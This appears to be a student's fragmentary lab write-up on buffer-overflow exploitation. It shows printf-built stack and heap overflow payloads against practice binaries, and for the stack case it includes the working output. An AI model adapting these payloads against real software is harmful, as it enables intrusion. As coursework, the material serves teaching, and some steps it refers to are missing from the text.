with gdb debugger, it is possible to get the function address. Need to overflow the buffer with the address of target_function.

setting the breakpoint at the vulnerable function and running

indicates there are 18 bytes difference between the return address of the vulnerable function. 

Hence, 

printf 'AAAAAAAAAAAAAAAAAA\xbb\x11\x40\x00\x00\x00\x00\x00' > p.txt

cat p.txt |./sof
Enter some text: You entered: AAAAAAAAAAAAAAAAAAï¿½@
Yes! You did it!


<h2>Q2</h2>
This question is exploiting the vulnerability that occurs from heap alignment. There are two mallocs call, and we can check two variables are aligned on the memory.

We can find that the result of malloc is stored in rbp - 0x10 and 0x8 each.
As the variable is the pointer, we can check the value stored in the variable with following command.

We can check two things: 
1. values are stored in little endian (note that A is stored in the third block)
2. difference between two memory allocation is 32, 16('c'-'a')
The memory alignment will be as following:


printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x13' >hof.txt
